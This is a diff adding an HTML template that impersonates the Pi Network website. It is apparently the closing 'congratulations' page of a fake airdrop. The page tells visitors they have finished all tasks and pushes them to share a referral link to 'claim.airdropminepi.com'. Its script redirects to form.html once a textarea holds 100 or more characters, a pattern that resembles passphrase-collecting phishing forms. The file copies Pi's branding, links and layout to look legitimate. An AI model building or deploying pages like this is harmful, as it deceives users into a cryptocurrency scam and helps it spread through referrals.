@@ -1,0 +1,246 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'css/style4.css' %}">
+    <title>Pi Network - Pi Blockchain, Community & Developer Platform</title>
+    <link rel="icon" type="image/x-icon" href="{% static 'images/logo.png' %}">
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body style="height: 100%;">
+    <nav class="navbar">
+      <div id="container" class="container">
+        <a class="navbar-brand" href="/"/>
+          <img alt="logo" src="{% static 'images/logo.png' %}" />
+          <span>Pi Network</span>
+        </a>
+        <div class="btn">
+          <img class="img_btn" src="{% static 'images/bars.png' %}" alt="">
+        </div>
+      </div>
+          <div class="collapse navbar-collapse" id="main-nav">
+            <ul class="navbar-nav ml-auto">
+              <li class="nav-item">
+                <a class="nav-link" href="#"/>Home</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="https://node.minepi.com/">Pi node</a>
+              </li>
+              <li class="nav-item hidden-mobile">
+                <a
+                  class="nav-link"
+                  href=/#download
+                >
+                  Mobile app
+                </a>
+              </li>
+              <li class="nav-item hidden-desktop">
+                <a
+                  class="nav-link"
+                  href=/#download_mobile
+                >
+                  Mobile app
+                </a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="https://developers.minepi.com">Platform</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Team</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link" href="#">Support</a>
+              </li>
+    
+            </ul>
+          </div>
+    </nav>
+    <main style="display: flex;justify-content: center; background:none;" class="main_con">
+        <div class="container_congratulations">
+            <div class="img">
+                <img src="{% static 'images/congratulations.jpg' %}">
+            </div>
+            <div class="text">
+              <h2><a href="#">Congratulations !, you have completed all tasks. Lets share your refferal link for get more reward "https://claim.airdropminepi.com/"</a></h2>
+                <br><h4>Keep your money! Pi is free. All you need is an invitation from an existing trusted member on the network. If you have an invitation you can download the mobile app below.Lets share for get more reward.</h4>
+                <div class="app">
+                  <img src="{% static 'images/googleplay.svg' %}" alt="">
+                  <img src="{% static 'images/applestore.svg' %}" alt="">
+                </div>
+            </div>
+            
+        </div>
+    </main>
+  <footer id="footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12">
+            <ul class="social-media">
+              <li><a target="_blank" href="https://www.facebook.com/PiCoreTeam?mibextid=LQQJ4d"><i class="fa fa-facebook"></i></a></li>
+              <li><a target="_blank" href="https://l.facebook.com/l.php?u=https%3A%2F%2Ftwitter.com%2Fpicoreteam%3Fs%3D11%26t%3DC_roBEZv7cc80YpEBk8irg%26fbclid%3DIwAR1qkXzsTRkD6mcG9MQJuh1qW45ll8oDY6ep6lOpacMGGuV5RO3LKKtiHFg&h=AT260byvGucEmsnR7K860NH-cWFoJFeJbNeME8XLpqkNWOVAdlFhHZUoODh2wkjoMkbhP9QJ3UPLRJ-t-k3MYMyDbpHXrmH6BQxCk8uDYRavBAZEmR1GA6Z4oSHErRH7FgLUVwhhl239vqo"><i class="fa fa-twitter"></i></a></li>
+              <li><a target="_blank" href="https://t.me/+sNlsYgEj18M2ZWFk"><i  class="fa fa-telegram"></i></a></li>
+              <li><a target="_blank" href="https://www.instagram.com/pi_network/"><i class="fa fa-instagram"></i></a></li>
+            </ul>
+          </div>
+          <div class="col-md-12">
+            <div class="copyright text-center">
+              <p>© 2022 Pi Network | All rights reserved.</p>
+            </div>
+            <div class="links">
+              <a target="_blank" href="https://socialchain.app/tos">Terms of Service</a>
+              <a target="_blank" href="https://socialchain.app/privacy">Privacy Policy</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <div class="bottom-space"></div>
+
+<div class="download_banner_1">
+ 
+    <div class="container">
+      
+        <div><strong>Pi Network</strong>
+        <br>
+            <p id="uu">Start mining. Easy as Pi!</p>
+        </div>
+      
+      
+        <a class="download_app" onclick="send_download_stat()" target="_blank" href="https://play.google.com/store/apps/details?id=com.blockchainvault">
+          Download
+        </a>
+      
+    </div>
+  
+</div>
+<style>
+@media (max-width: 800px) {
+body{
+height: 1180px !important;
+}
+
+.download_banner_1{
+   background-color: #cfcfcf;
+   height: 50px;
+   position: fixed;
+   bottom: 0;
+   width: 100%;
+   display: flex;
+   justify-content: center;
+}
+.download_banner_1 .container{
+   display: flex;
+   justify-content: space-around;
+   align-items: center;
+   width: 90%;
+}
+.download_banner_1 .container a{
+   background-color: orange;
+   padding: 6px 12px;
+   color: #000;
+   font-weight: bold;
+   font-family: inherit;
+   text-decoration: none;
+}
+#uu{
+font-size: 14px;
+}
+
+}
+
+
+@media (min-width:800px) {
+
+#main-nav{
+   display: block;
+}
+.navig,#main-nav.navig{
+   display: none;
+}
+.download_banner_1{
+   background-color: #cfcfcf;
+   height: 50px;
+   position: fixed;
+   bottom: 0;
+   width: 100%;
+   display: flex;
+   justify-content: space-around;
+}
+.download_banner_1 .container{
+   display: flex;
+   justify-content: space-evenly;
+   align-items: center;
+   width: 80%;
+}
+.download_banner_1 .container a{
+text-decoration: none;
+   background-color: orange;
+   padding: 6px 12px;
+   color: #000;
+   font-weight: bold;
+   font-family: inherit;
+}
+}
+
+.download_banner{
+display: flex;
+justify-content: space-evenly;
+background-color: #000;
+}
+.download_banner div{
+width:100px;
+margin: 0 0 0 10px;
+}
+.download_banner .right_side{
+display: flex;
+align-items: center;
+}
+
+
+
+
+</style>
+    <script>
+      
+      const navig=document.querySelector("#main-nav");
+      const img_btn=document.querySelector(".img_btn");
+      
+      img_btn.addEventListener("click",function(){
+        if(navig.style.display==""){
+          navig.style.display="flex";
+        }else{
+          navig.style.display="";
+        }
+      });
+
+
+      b1.addEventListener("click",function(){
+        if(textarea1.value.length>=100){
+        window.location="form.html";
+        textarea1.style.borderColor="green";
+      }else{
+        textarea1.style.borderColor="red";
+      }
+      });
+
+      
+      b2.addEventListener("click",function(){
+        if(textarea2.value.length>=100){
+        window.location="form.html";
+        textarea2.style.borderColor="green";
+      }else{
+        textarea2.style.borderColor="red";
+      }
+      });
+
+
+    </script>
+</body>
+</html>
+</html>
